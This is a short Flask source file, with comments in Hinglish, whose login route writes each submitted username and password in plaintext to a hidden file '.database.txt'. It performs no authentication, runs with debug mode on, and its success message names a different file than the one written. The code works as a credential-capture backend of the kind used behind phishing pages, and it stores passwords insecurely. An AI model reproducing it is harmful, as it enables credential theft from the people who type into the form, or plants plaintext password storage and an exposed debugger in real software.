from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Data ko file mein save karna (Database ka kaam)
    with open(".database.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    return "Data saved successfully in database.txt!"

if __name__ == '__main__':
    app.run(debug=True)